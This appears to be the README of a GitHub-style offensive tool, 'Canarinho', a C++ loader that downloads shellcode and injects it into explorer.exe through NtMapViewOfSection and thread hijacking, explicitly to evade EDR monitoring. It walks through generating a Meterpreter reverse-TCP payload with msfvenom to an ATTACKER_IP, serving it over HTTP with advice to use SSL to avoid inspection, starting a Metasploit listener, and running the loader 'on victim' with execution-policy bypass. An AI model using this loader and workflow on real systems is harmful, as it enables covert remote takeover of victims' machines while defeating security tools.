# 🐦 Canarinho

> C++ Loader injector using the `NtMapViewOfSection` shared memory technique.

---

## How It Works

```
HTTP GET /shellcode file using WinHTTP lib
        ↓
CreateProcess("explorer.exe", CREATE_SUSPENDED) - Or svchost.exe, notepad.exe
        ↓
NtCreateSection (PAGE_EXECUTE_READWRITE, SEC_COMMIT)
        ↓
NtMapViewOfSection → local process  (write shellcode here)
        ↓
NtMapViewOfSection → remote process (same physical pages, no WriteProcessMemory)
        ↓
GetThreadContext → set RCX = remote mapped address
        ↓
SetThreadContext + ResumeThread → shellcode executes in explorer.exe
        ↓
NtUnmapViewOfSection → clean up local view
```

---

## Why NtMapViewOfSection
Standard injection (`VirtualAllocEx` + `WriteProcessMemory`) is heavily monitored by EDRs. 
The shared section approach avoids both syscalls:

| Classic Injection  | Canarinho             |
| VirtualAllocEx     | NtCreateSection       |
| WriteProcessMemory | RtlCopyMemory (local) |
| CreateRemoteThread | Thread context hijack |

---
## Requirements
- Windows (build machine)
- Visual Studio 2019/2022 (C++ workload)
- A running HTTP server serving the payload e.g `sc.bin`
---

## Build
Open `canarinho.sln` in Visual Studio, set configuration to **Release x64**, and build.
```
Build → Build Solution   (Ctrl+Shift+B)
Output: x64/Release/canarinho.exe
```

---
## Usage
### 1. Generate shellcode (Metasploit example below)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f raw EXITFUNC=thread -o sc.bin
```

### 2. Serve shellcode, ideally in a webserver running apache/nginx with SSL for avoid being inspected. The example below is for study purposes

```bash
python3 -m http.server 80
```

### 3. Update the target IP
In `canarinho.cpp`, set your attacker IP before building:

```cpp
std::vector<BYTE> shellcode = Download(L"<ATTACKER_IP>\0", L"/sc.bin\0");
```

### 4. Start the listener
```bash
msfconsole -q -x "use multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST <ATTACKER_IP>; set LPORT 443; run"
```

### 5. Execute on victim
```powershell
.\canarinho.exe
powershell.exe .\canarinho.exe
cmd.exe /c canarinho.exe
powershell.exe -ep bypass -F .\canarinho.exe
```

---

## Project Structure
```
canarinho/
├── canarinho.sln
├── canarinho.cpp          ← injection logic + HTTP downloader
├── Native.h               ← NT API type definitions
├── NtMapViewOfSection.vcxproj
├── NtMapViewOfSection.vcxproj.filters
└── NtMapViewOfSection.vcxproj.user
```
---
## Disclaimer

For authorized security testing and research only.

